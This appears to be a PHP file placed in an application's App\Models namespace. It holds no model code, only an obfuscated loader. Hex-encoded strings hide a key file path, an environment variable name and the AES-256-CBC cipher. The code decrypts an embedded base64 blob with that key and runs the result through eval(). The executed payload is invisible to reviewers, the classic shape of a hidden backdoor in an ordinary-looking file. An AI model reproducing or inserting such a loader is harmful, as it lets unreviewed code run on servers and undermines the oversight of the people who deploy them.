<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('BM1sZhzzsvLo9g16sj+ZJg==');

$c=base64_decode(

'vGbw8NPNPjKF3ll78HB6MNUkJ9AwiPCb+woI6WfikgiTntjAB48A5BDtpW4pDliN+2uFVDexFgpI' .
'Lr7VcfUq7GaznMtfeAdm6XHHneSiCTzJlfhxmSmDsswwO9k2xmTgnhizQG4wlNC37da6LuDj2c7q' .
'cwWMKMMrRTRuhBSV294SDN4OgP8tLjeExwUkLbWF/oEcxbjS+/MYRhD2fEcANtvNWZi8F/L+Qupp' .
'uEYSGhlbOSTWeM3ZkLQdfLzpbp6ELUsBKozicH30o74hLKRIpz1NFcnDBNyqUOPGrE0D5t2c744R' .
'Ydq0D2jB6P4y6AlaDuI+4NveWmKxZYjvQumNzQ57osOdzq1v10zWiYrnC4Lo6Ul2esvfW1nFmXwq' .
'1g6XF2eVIlEblh0EqRKwsrI0ln2ydC7Xk64MM/YrM46Fosn+EyM+4zJoHfZeWvVnOk2Pd8hPl+5P' .
'xrhu98UbLOqSko6S44kys5ry0jxkhQAF6i17XBz6B7GOO/STrbdZegvi8mE3731mBiKK5QtLbYZB' .
'x3mdsX7qKVnLeLW/XNWAvH2QqOfxINKBYvCHSPV4x9QycCRVHuL26Dr6SH2kAY37CVa6seZtUjI2' .
'jNYY3oHgeqOu4t9T+ZcS+RdlL0iVWqHo7hGR0WXBkrdVsS89eoBfvSVurToahWioV/u2o4TSqoku' .
'nWfwJGnCTStiBo3yOonE+pqYebufECtP6vtDWqb2a9L2zt2kQ/P6hXDOo3AtE80NUnuydW0Ziiyd' .
'+2MHrcZs8r1bU6aA0q103rbYt+rNGbf0O7j1MGaQ35ofA8TBx4561zVyaecysAYMLSoeHEnebKyh' .
'pqp3vSKQXEUZ5gzh6TMsOFdp1Wod/rNI3OLBAnqKHJ2AA93w2qMqsKPO4H+YaE3YDybiax3oNNO5' .
'et3rctDVBTVIeENe3RBWpWwQZ/YK05q8kopYAFoPFt/4lacCC9jYb/qBYFJ08Qg5oOq6Qw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

